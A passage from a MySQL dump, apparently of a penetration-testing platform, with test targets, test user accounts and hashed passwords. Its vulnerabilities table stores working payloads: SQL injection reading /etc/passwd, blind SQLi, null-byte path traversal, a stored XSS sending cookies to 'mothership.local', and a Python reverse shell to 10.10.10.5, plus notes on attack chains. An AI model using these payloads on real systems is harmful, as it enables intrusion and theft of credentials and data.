INSERT INTO `services` (`service_id`, `target_id`, `service_name`, `port`, `protocol`, `state`, `version`, `created_at`, `updated_at`, `data`) VALUES
(2, '60077e5848038468386282765ccd41b1', 'SSH', 22, 'TCP', 1, '2.2.2.2', '2025-02-23 10:38:55', '2025-02-23 10:38:55', '');

-- --------------------------------------------------------

--
-- Table structure for table `targets`
--

CREATE TABLE `targets` (
  `target_id` varchar(100) NOT NULL,
  `scan_id` varchar(100) NOT NULL,
  `host` varchar(255) NOT NULL,
  `host_ip` varchar(45) NOT NULL,
  `target_ip` varchar(45) NOT NULL,
  `firewall_name` varchar(25) NOT NULL DEFAULT 'NONE',
  `decoys` text NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `targets`
--

INSERT INTO `targets` (`target_id`, `scan_id`, `host`, `host_ip`, `target_ip`, `firewall_name`, `decoys`, `created_at`, `updated_at`) VALUES
('08d87209ae32dcfb96a84c8ac84056fc', '12cbf5f4922792f5eb72d2972abe8483', 'target2.com', '16843009', '16843009', '', '8.8.8.8,2.2.4.4', '2025-02-21 10:35:47', '2025-02-21 10:35:47'),
('2ff226e95a842f1d5f1c7c329b5dd00c', '12cbf5f4922792f5eb72d2972abe8483', 'testtarget.com', '16843009', '16843009', 'CloudFlare', '8.8.8.8,2.2.4.4', '2025-02-21 10:43:04', '2025-02-21 10:43:04'),
('4676429abe558d0669a46ba7cf470bb4', '12cbf5f4922792f5eb72d2972abe8483', 'domain.com', '16843009', '16843009', '', '8.8.8.8,2.2.4.4', '2025-02-13 09:40:03', '2025-02-13 09:40:03'),
('5e76b9cef4e34c0045fd9c0d98cdaf09', '12cbf5f4922792f5eb72d2972abe8483', 'testtarget.com', '16843009', '16843009', '', '8.8.8.8,2.2.4.4', '2025-02-21 10:41:45', '2025-02-21 10:41:45'),
('60077e5848038468386282765ccd41b1', '12cbf5f4922792f5eb72d2972abe8483', 'workingtarget.com', '16843009', '16843009', 'CloudFlare', '8.8.8.8,2.2.4.4', '2025-02-21 10:47:54', '2025-02-21 10:47:54'),
('dd0b32a96a4ef1321afaebcd084a9596', '12cbf5f4922792f5eb72d2972abe8483', 'testtarget.com', '16843009', '16843009', 'CloudFlare', '8.8.8.8,2.2.4.4', '2025-02-21 10:44:32', '2025-02-21 10:44:32');

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE `user` (
  `userid` varchar(255) NOT NULL,
  `ownerid` varchar(255) NOT NULL,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `active` tinyint(1) NOT NULL,
  `anonymous` tinyint(1) NOT NULL,
  `verified` tinyint(1) NOT NULL,
  `admin` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`userid`, `ownerid`, `username`, `email`, `password`, `active`, `anonymous`, `verified`, `admin`, `created_at`, `updated_at`) VALUES
('05f65378-685c-45cb-aa5d-f69bc395ba9d', '05f65378-685c-45cb-aa5d-f69bc395ba9d', 'test3', 'test3@mail.com', '$2a$10$mNkYXA5JTpuBxsb9Lfp4m.u4b/LslIn9TppecSwwIlg3lRtcTqKmO', 1, 0, 1, 1, '2025-03-10 07:21:26', '2025-03-10 07:21:26'),
('123456', '12345', 'test user', 'user@mail.com', '$2a$10$GA3fSdt0KF6jMSeTuZdkruNaUhkBEmqTEYZNJu8s.bJ8QhPNAWc6O', 1, 0, 1, 1, '2025-01-20 08:32:53', '2025-01-20 08:32:53'),
('1234567', '12345', 'test user', 'user2@mail.com', '$2a$10$DT0OAtCuMIuXVuNAXhHfsupSz4uZ.2Oman/JZXNv6tqOza3nUfvKK', 1, 0, 1, 1, '2025-01-20 09:17:23', '2025-01-20 09:17:23'),
('1CaTkgTNy_HJDrzDW7BqEup', '1CaTkgTNy_HJDrzDW7BqEup', 'Tester1', 'tester@test.com', '$2a$10$/KVQ9Xdjsyi/V68R/ruLI.Uk4aE3x9OVLjFRInfKo1PJI6WRrH692', 1, 0, 1, 1, '2026-04-27 05:51:22', '2026-04-27 05:51:22'),
('1CZYnLqPm_hpbxnVthULPXw', '1CZYnLqPm_hpbxnVthULPXw', 'errortest', 'errortest@mail.com', '$2a$10$1xXnlLBUhyKnoli0Ddw89ujWEIfydsLgmP3SK7UWD6KWuZRMGea/O', 1, 0, 1, 1, '2026-03-30 06:21:40', '2026-03-30 06:21:40'),
('27c7dfcf-168c-4744-a572-848489f16634', '27c7dfcf-168c-4744-a572-848489f16634', 'test user3', 'user4@mail.com', '$2a$10$hQRRrNvrQi1q71AB/VVw.eC6PLeRnNY8PauQ0d7ifuQQq1jrxVpKG', 1, 0, 1, 1, '2025-03-14 07:57:30', '2025-03-14 07:57:30'),
('a09003a2-60ef-4123-88f1-58db25136fea', 'a09003a2-60ef-4123-88f1-58db25136fea', 'test', 'test@mail.com', '$2a$10$n.80KxrpBgPs1GoLpa3wh.SvhlG823kKaea5ye202ng8Trdpw81Pm', 1, 0, 1, 1, '2025-03-10 06:27:41', '2025-03-10 06:27:41'),
('cd89975f-525f-4bb8-b3b8-12f4a145535a', 'cd89975f-525f-4bb8-b3b8-12f4a145535a', 'test', 'test2@mail.com', '$2a$10$XjyfXwZfHRhdZXhMyUAtsulH49kNZ2bgCqtobN.s5Um/6obhBPPUi', 1, 0, 1, 1, '2025-03-10 06:40:57', '2025-03-10 06:40:57'),
('ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'sam', 'sam@mail.com', '$2a$10$3mKi67y4MbFAog9E1W2Gpe/q2gKuf8MTiiZAhJmWuiATzb6biyECS', 1, 0, 1, 1, '2025-03-14 08:03:58', '2025-03-14 08:03:58');

-- --------------------------------------------------------

--
-- Table structure for table `virus`
--

CREATE TABLE `virus` (
  `aptid` int(11) NOT NULL,
  `virusid` varchar(255) NOT NULL,
  `hash` text NOT NULL,
  `virustype` varchar(255) NOT NULL,
  `filetype` varchar(255) NOT NULL,
  `communicationmode` varchar(255) NOT NULL,
  `ostype` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `vulnerabilities`
--

CREATE TABLE `vulnerabilities` (
  `vulnerability_id` varchar(255) NOT NULL,
  `target_id` varchar(100) NOT NULL,
  `name` int(11) NOT NULL,
  `severity` int(11) NOT NULL,
  `payload` longtext DEFAULT NULL,
  `attack_type` int(11) NOT NULL,
  `grouped` tinyint(1) DEFAULT 0,
  `authenticated` tinyint(1) DEFAULT 0,
  `works` tinyint(1) DEFAULT 0,
  `details` longtext DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `vulnerabilities`
--

INSERT INTO `vulnerabilities` (`vulnerability_id`, `target_id`, `name`, `severity`, `payload`, `attack_type`, `grouped`, `authenticated`, `works`, `details`, `created_at`, `updated_at`) VALUES
('1Ca7EFXwo_7uE89q7EQJiE7', 'dd0b32a96a4ef1321afaebcd084a9596', 2, 5, '\') UNION SELECT null,@@version,load_file(\'/etc/passwd\'),null--', 1, 0, 0, 0, 'Time-based SQLi in search.php \'q\' parameter. Allows reading local files via MySQL load_file.', '2026-04-16 09:40:26', '2026-04-16 09:40:26'),
('1Ca7EGstP_2AXsmjHotc4L7', '60077e5848038468386282765ccd41b1', 0, 0, '', 0, 1, 0, 1, 'STEP 1: Stored XSS (V4) used to capture Admin Cookie. STEP 2: Authenticated as Admin to access diagnostics page. STEP 3: Executed Python reverse shell via Command Injection (V5).', '2026-04-16 09:40:45', '2026-04-16 09:40:45'),
('1Ca7EHpVG_SDB4TtmxAV4Dy', '60077e5848038468386282765ccd41b1', 0, 0, '', 0, 1, 0, 1, 'STEP 1: SQLi (V1) used to dump the list of valid Invoice IDs from the \'invoices\' table. STEP 2: Scripted IDOR (V3) requests to download the top 500 sensitive PDFs.', '2026-04-16 09:40:57', '2026-04-16 09:40:57'),
('1Ca7EJkpG_wB4oXVyA5occM', '60077e5848038468386282765ccd41b1', 0, 0, '', 0, 0, 0, 1, 'Injected a PHP reverse shell hosted on the Mothership into the vulnerable lang parameter. Resulted in immediate RCE as user \'apache\'.', '2026-04-16 09:41:10', '2026-04-16 09:41:10'),
('1Ca7EKqjE_DkkYRpfyE6UQ3', '60077e5848038468386282765ccd41b1', 0, 0, '', 0, 0, 0, 1, 'Used LFI to read \'/etc/wazuh-agent/ossec.conf\' and \'/root/.ssh/authorized_keys\'. Identified hardcoded manager IPs for the RMM fleet.', '2026-04-16 09:41:25', '2026-04-16 09:41:25'),
('1Ca7EMCf6_tTWte1GR68BXd', '60077e5848038468386282765ccd41b1', 0, 0, '', 0, 0, 0, 1, 'Performed a time-based inference attack. Successfully reconstructed the \'user\' table schema and exfiltrated 150 unsalted MD5 hashes of legacy department accounts.', '2026-04-16 09:41:43', '2026-04-16 09:41:43'),
('1Ca7FhJsL_MrcfNbb1L3PiL', '60077e5848038468386282765ccd41b1', 2, 5, '\') OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--', 1, 0, 0, 1, 'Time-based blind SQL injection in the legacy department portal. Located in the \'session_id\' cookie. Confirmed by 5-second response delay. Allows for full schema inference and data exfiltration.', '2026-04-16 09:59:23', '2026-04-16 09:59:23'),
('1Ca7FiDo1_SUDKCMPV6GrLW', '60077e5848038468386282765ccd41b1', 0, 4, '/index.php?view=../../../../../../etc/passwd%00', 1, 0, 0, 1, 'LFI discovered in the departmental documentation viewer. The application fails to sanitize the \'view\' parameter. Using null-byte injection, we can bypass the appended .php extension to read sensitive OS configuration files.', '2026-04-16 09:59:35', '2026-04-16 09:59:35'),
('1Ca7FizFh_YDAQdF9W32t82', '60077e5848038468386282765ccd41b1', 6, 4, 'GET /api/v1/finance/invoice/INV-2026-001 -> INV-2026-999', 1, 0, 1, 1, 'The finance API does not check for object ownership. An authenticated user from Department A can access the invoices of Department B by simply incrementing the invoice ID in the URL. This allows mass exfiltration of financial records.', '2026-04-16 09:59:46', '2026-04-16 09:59:46'),
('1Ca7Fk2Mj_a7pAkvhicNEqQ', '60077e5848038468386282765ccd41b1', 8, 3, '<script>fetch(\'https://mothership.local/log?c=\'+document.cookie);</script>', 1, 0, 0, 1, 'Stored Cross-Site Scripting in the \'Help Desk\' ticket comment section. The payload is rendered without escaping in the IT Admin dashboard. This can be used to hijack administrative sessions via cookie theft.', '2026-04-16 10:00:00', '2026-04-16 10:00:00'),
('1Ca7FknhU_tcBQGAnxwgH9C', '60077e5848038468386282765ccd41b1', 3, 5, '127.0.0.1; export RHOST=\'10.10.10.5\'; export RPORT=4444; python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")\'', 1, 0, 1, 1, 'Command injection in the network diagnostics \'ping\' utility. The input is concatenated directly into a shell command. Requires \'Network Operator\' privileges but provides full reverse shell access as the \'www-data\' user.', '2026-04-16 10:00:10', '2026-04-16 10:00:10'),
('1CaAqR1kT_h6yzj9jhiw3Vu', '60077e5848038468386282765ccd41b1', 3, 5, '192.168.4.56; export RHOST=\'10.10.10.5\'; export RPORT=4444; python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")\'', 1, 0, 1, 1, 'Command injection in the network diagnostics \'ping\' utility. The input is concatenated directly into a shell command. Requires \'Network Operator\' privileges but provides full reverse shell access as the \'www-data\' user.', '2026-04-18 07:23:21', '2026-04-18 07:23:21'),
('1CaB9pQMV_tgLpVsuNWQMYt', '60077e5848038468386282765ccd41b1', 3, 5, '192.168.4.56; export RHOST=\'10.10.10.5\'; export RPORT=4444; python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")\'', 1, 0, 1, 1, 'Command injection in the network diagnostics \'ping\' utility. The input is concatenated directly into a shell command. Requires \'Network Operator\' privileges but provides full reverse shell access as the \'www-data\' user.', '2026-04-18 11:24:41', '2026-04-18 11:24:41');

-- --------------------------------------------------------

--
-- Table structure for table `webdata`
--

CREATE TABLE `webdata` (
  `target_id` varchar(100) NOT NULL,
  `directory_path` text DEFAULT NULL,
  `parameter_path` text DEFAULT NULL,
  `file_path` text DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `webdata`
--

INSERT INTO `webdata` (`target_id`, `directory_path`, `parameter_path`, `file_path`, `created_at`, `updated_at`) VALUES
('60077e5848038468386282765ccd41b1', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjpbImRvbWFpbi5jby9kb21haW4iLCJkb21haW4uY29tL2Fub3RoZXIvZW5kcG9pbnQiXX0.fMc753BPrpfYAxH4Mki6thImMwX4EgNBEZii1jla9ZI', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjpbImRvbWFpbi5jby9kb21haW4_ZG9tPWhhY2tlZCIsImRvbWFpbi5jb20vYW5vdGhlci9lbmRwb2ludD9uYW1lPWVuZCJdfQ.4fyx8U5iRc8qT-C81imRGgaaNIpdYcF7eA2lR8EPJIY', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjpbImRvbWFpbi5jby9kb21haW4vZG9tYWluLnBkZiIsImRvbWFpbi5jb20vYW5vdGhlci9lbmRwb2ludC9lbmRwb2ludC5wbmciXX0.V0hGoM4K_ExgSEaz6WL3NM9jgprKaII_nnWFb2hxEWA', '2025-02-23 07:10:09', '2025-02-23 07:10:09');

-- --------------------------------------------------------

--
-- Table structure for table `yara_rule`
--

CREATE TABLE `yara_rule` (
  `yr_id` int(11) NOT NULL,
  `ioc_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `meta` text NOT NULL,
  `condition` text NOT NULL,
  `actions` text NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `apikey`
--
ALTER TABLE `apikey`
  ADD PRIMARY KEY (`key_id`),
  ADD KEY `ownerid` (`ownerid`);

--
-- Indexes for table `appointments`
--
ALTER TABLE `appointments`
  ADD PRIMARY KEY (`appointmentid`),
  ADD KEY `userid` (`userid`);

--
-- Indexes for table `apt`
--
ALTER TABLE `apt`
  ADD PRIMARY KEY (`aptid`);

--
-- Indexes for table `assets`
--
ALTER TABLE `assets`
  ADD KEY `owner_id` (`owner_id`);

--
-- Indexes for table `blogs`
--
ALTER TABLE `blogs`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `uuid` (`uuid`);

--
-- Indexes for table `categories`
--
ALTER TABLE `categories`
  ADD PRIMARY KEY (`id`),
  ADD KEY `parent_id` (`parent_id`);

--
-- Indexes for table `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`),
  ADD KEY `blog_uuid` (`blog_uuid`);

--
-- Indexes for table `enum_types`
--
ALTER TABLE `enum_types`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `type` (`type`);

--
-- Indexes for table `events`
--
ALTER TABLE `events`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `exploits`
--
ALTER TABLE `exploits`
  ADD PRIMARY KEY (`exploit_id`),
  ADD KEY `target_id` (`target_id`);

--
-- Indexes for table `hashes`
--
ALTER TABLE `hashes`
  ADD PRIMARY KEY (`userid`),
  ADD UNIQUE KEY `hash` (`hash`);

--
-- Indexes for table `ioc`
--
ALTER TABLE `ioc`
  ADD PRIMARY KEY (`ioc_id`);

--
-- Indexes for table `minion`
--
ALTER TABLE `minion`
  ADD PRIMARY KEY (`minionid`),
  ADD UNIQUE KEY `minionid` (`minionid`),
  ADD KEY `userid` (`userid`),
  ADD KEY `mothershipid` (`mothershipid`),
  ADD KEY `ownerid` (`ownerid`);

--
-- Indexes for table `motherships`
--
ALTER TABLE `motherships`
  ADD PRIMARY KEY (`msid`),
  ADD UNIQUE KEY `msid` (`msid`),
  ADD KEY `motherships_owner_fk` (`ownerid`);

--
-- Indexes for table `plugins`
--
ALTER TABLE `plugins`
  ADD PRIMARY KEY (`hash`),
  ADD KEY `owner` (`owner`);

--
-- Indexes for table `rmm_executions`
--
ALTER TABLE `rmm_executions`
  ADD PRIMARY KEY (`execution_id`),
  ADD KEY `task_id_idx` (`task_id`);

--
-- Indexes for table `rmm_tasks`
--
ALTER TABLE `rmm_tasks`
  ADD PRIMARY KEY (`task_id`);

--
-- Indexes for table `scans`
--
ALTER TABLE `scans`
  ADD PRIMARY KEY (`scan_id`),
  ADD UNIQUE KEY `scan_id` (`scan_id`),
  ADD KEY `owner_id` (`owner_id`);

--
-- Indexes for table `services`
--
ALTER TABLE `services`
  ADD PRIMARY KEY (`service_id`),
  ADD KEY `target_id` (`target_id`);

--
-- Indexes for table `targets`
--
ALTER TABLE `targets`
  ADD PRIMARY KEY (`target_id`),
  ADD UNIQUE KEY `target_id` (`target_id`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`userid`),
  ADD UNIQUE KEY `userid` (`userid`),
  ADD UNIQUE KEY `email` (`email`);

--
-- Indexes for table `virus`
--
ALTER TABLE `virus`
  ADD PRIMARY KEY (`aptid`);

--
-- Indexes for table `vulnerabilities`
--
ALTER TABLE `vulnerabilities`
  ADD PRIMARY KEY (`vulnerability_id`),
  ADD KEY `target_id` (`target_id`);

--
-- Indexes for table `webdata`
--
ALTER TABLE `webdata`
  ADD KEY `target_id` (`target_id`);

--
-- Indexes for table `yara_rule`
--
ALTER TABLE `yara_rule`
  ADD PRIMARY KEY (`yr_id`),
  ADD KEY `ioc_id` (`ioc_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `apt`
--
ALTER TABLE `apt`
  MODIFY `aptid` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `blogs`
--
ALTER TABLE `blogs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `categories`
--
ALTER TABLE `categories`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `comments`
--
ALTER TABLE `comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `enum_types`
--
ALTER TABLE `enum_types`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT for table `events`
--
ALTER TABLE `events`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `ioc`
--
ALTER TABLE `ioc`
  MODIFY `ioc_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `services`
--
ALTER TABLE `services`
  MODIFY `service_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `virus`
--
ALTER TABLE `virus`
  MODIFY `aptid` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `yara_rule`
--
ALTER TABLE `yara_rule`
  MODIFY `yr_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `apikey`
--
ALTER TABLE `apikey`
  ADD CONSTRAINT `apikey_owner_fk` FOREIGN KEY (`ownerid`) REFERENCES `user` (`userid`);

--
-- Constraints for table `appointments`
--
ALTER TABLE `appointments`
  ADD CONSTRAINT `appointments_ibfk_1` FOREIGN KEY (`userid`) REFERENCES `user` (`userid`);

--
-- Constraints for table `assets`
--
ALTER TABLE `assets`
  ADD CONSTRAINT `assets_ibfk_1` FOREIGN KEY (`owner_id`) REFERENCES `user` (`userid`);

--
-- Constraints for table `categories`
--
ALTER TABLE `categories`
  ADD CONSTRAINT `categories_ibfk_1` FOREIGN KEY (`parent_id`) REFERENCES `categories` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `comments`
--
ALTER TABLE `comments`
  ADD CONSTRAINT `comments_ibfk_1` FOREIGN KEY (`blog_uuid`) REFERENCES `blogs` (`uuid`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `exploits`
--
ALTER TABLE `exploits`
  ADD CONSTRAINT `exploit_target_fk` FOREIGN KEY (`target_id`) REFERENCES `targets` (`target_id`) ON DELETE CASCADE;

--
-- Constraints for table `hashes`
--
ALTER TABLE `hashes`
  ADD CONSTRAINT `hashes_ibfk_1` FOREIGN KEY (`userid`) REFERENCES `user` (`userid`);

--
-- Constraints for table `minion`
--
ALTER TABLE `minion`
  ADD CONSTRAINT `minion_ibfk_1` FOREIGN KEY (`userid`) REFERENCES `user` (`userid`),
  ADD CONSTRAINT `minion_ibfk_2` FOREIGN KEY (`mothershipid`) REFERENCES `motherships` (`msid`),
  ADD CONSTRAINT `minion_ibfk_3` FOREIGN KEY (`ownerid`) REFERENCES `user` (`userid`);

--
-- Constraints for table `motherships`
--
ALTER TABLE `motherships`
  ADD CONSTRAINT `motherships_owner_fk` FOREIGN KEY (`ownerid`) REFERENCES `user` (`userid`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `plugins`
--
ALTER TABLE `plugins`
  ADD CONSTRAINT `plugins_ibfk_1` FOREIGN KEY (`owner`) REFERENCES `user` (`userid`);

--
-- Constraints for table `scans`
--
ALTER TABLE `scans`
  ADD CONSTRAINT `scans_ibfk_1` FOREIGN KEY (`owner_id`) REFERENCES `user` (`userid`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `services`
--
ALTER TABLE `services`
  ADD CONSTRAINT `services_ibfk_1` FOREIGN KEY (`target_id`) REFERENCES `targets` (`target_id`);

--
-- Constraints for table `virus`
--
ALTER TABLE `virus`
  ADD CONSTRAINT `virus_ibfk_1` FOREIGN KEY (`aptid`) REFERENCES `apt` (`aptid`);

--
-- Constraints for table `vulnerabilities`
--
ALTER TABLE `vulnerabilities`
  ADD CONSTRAINT `vuln_target_fk` FOREIGN KEY (`target_id`) REFERENCES `targets` (`target_id`) ON DELETE CASCADE;

--
-- Constraints for table `webdata`
--
ALTER TABLE `webdata`
  ADD CONSTRAINT `webdata_ibfk_1` FOREIGN KEY (`target_id`) REFERENCES `targets` (`target_id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `yara_rule`
--
ALTER TABLE `yara_rule`
  ADD CONSTRAINT `yara_rule_ibfk_1` FOREIGN KEY (`ioc_id`) REFERENCES `ioc` (`ioc_id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
